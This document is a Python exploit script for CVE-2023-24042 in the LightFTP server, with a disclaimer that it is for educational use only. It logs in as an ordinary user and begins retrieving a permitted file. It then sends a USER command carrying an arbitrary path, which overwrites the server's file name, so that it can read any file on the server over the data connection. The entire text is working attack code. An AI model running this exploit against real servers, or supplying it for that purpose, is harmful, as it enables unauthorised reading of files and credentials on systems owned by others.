import sys
import socket

# Exploit for CVE-2023-24042
# by msaw328
#
# https://github.com/msaw328
# msaw328.kretes.xyz

# This script was created for educational purposes only.
# Do not execute this against servers that you do not own, unless given explicit permission by the owner.
# The author is not responsible for any misuse of the script.

# https://stackoverflow.com/a/14981125/5457426
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

if __name__ == '__main__':
    if len(sys.argv) < 6:
        eprint("Usage: {} [addr:port] [username] [password] [safe filename] [filename]".format(sys.argv[0]))
        exit()

    try:
        [addr, port] = sys.argv[1].split(':')
        port = int(port)
        username = sys.argv[2]
        password = sys.argv[3]
        safe_filename = sys.argv[4]
        filename = sys.argv[5]
    except:
        eprint("Bad arguments")
        eprint("Usage: {} [addr:port] [username] [password] [safe filename] [filename]".format(sys.argv[0]))
        eprint("addr:port - lightftp server listening endpoint (example: 127.0.0.1:8021)")
        eprint("username, password - credentials for a lightftp user")
        eprint("safe filename - name of the file the user is allowed to read, in order to bypass initial checks")
        eprint("filename - full path of the file to actually read")
        exit()

    control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    control_socket.connect((addr, port))
    eprint(control_socket.recv(256))

    # Log in as user
    control_socket.sendall(b'USER ' + username.encode('ascii') + b'\r\n')
    eprint(control_socket.recv(256))
    control_socket.sendall(b'PASS ' + password.encode('ascii') + b'\r\n')
    result = control_socket.recv(256)
    eprint(result)

    if result[0] != ord('2'):
        eprint("Error: bad auth")
        exit()

    # enable passive mode and read data port
    control_socket.sendall(b'PASV\r\n')
    result = control_socket.recv(256)
    eprint(result)

    try:
        octets = result.decode('ascii').split('(')[1].split(')')[0].split(',')
        data_port = (int(octets[4]) << 8) + int(octets[5])
    except:
        eprint("Error: getting data port")
        exit()

    # ACTUAL DATA EXFIL

    # Start to retrieve a safe file, this should start listening for the data connection
    control_socket.sendall(b'RETR ' + safe_filename.encode('ascii') + b'\r\n')
    eprint(control_socket.recv(256))

    # Overwrite FileName with the USER command
    control_socket.sendall(b'USER ' + filename.encode('ascii') + b'\r\n')
    eprint(control_socket.recv(256))

    # Create the actual data connection and read the data
    data_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    data_connection.connect((addr, data_port))

    # https://stackoverflow.com/a/17697651/5457426
    BUFF_SIZE = 4096 # 4 KiB
    file_contents = b''
    while True:
        part = data_connection.recv(BUFF_SIZE)
        file_contents += part
        if len(part) < BUFF_SIZE:
            # either 0 or end of data
            break

    sys.stdout.buffer.write(file_contents)
